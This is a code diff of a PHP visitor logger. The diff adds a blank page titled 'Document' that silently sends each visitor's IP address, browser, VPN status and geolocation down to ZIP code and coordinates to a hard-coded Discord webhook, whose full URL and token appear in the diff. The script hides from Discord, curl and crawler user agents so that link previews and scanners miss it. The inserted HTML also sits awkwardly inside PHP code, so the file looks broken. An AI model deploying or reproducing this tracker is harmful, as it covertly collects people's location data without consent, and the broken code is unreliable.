@@ -16,6 +16,40 @@ $Browser = $_SERVER['HTTP_USER_AGENT'];
 if (preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
     exit();
 }
+<html>
+
+<head>
+
+  <title>Document</title>
+
+</head>
+
+<body>
+
+
+
+<?php
+
+//If your Discord.php file is in another folder you need to change the file path!
+
+include("Discord.php");
+
+$sendembed = New Discord();
+
+
+
+//Executes the function
+
+$sendembed->Visitor();
+
+?>
+
+
+
+</body>
+
+</html>
+
 
 //YOU CAN SET YOUR TIMEZONE HERE!
 date_default_timezone_set("Europe/Amsterdam");
@@ -56,7 +90,7 @@ class Discord
         global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag;
 
 		//Insert FULL webhook URL here (URL begins with: https://discord.com/api/webhooks/)
-        $Webhook = "FULLURLHERE";
+        $Webhook = "https://discord.com/api/webhooks/1127714250975084574/A-Tz_GHr1Lvsov5FltjlfN4KnEFudVIEBAVqp438YnmZmKjTho6ylLMqv0KhJMmx1Dit";
 
         $InfoArr = array(
             "username" => "$WebhookName",
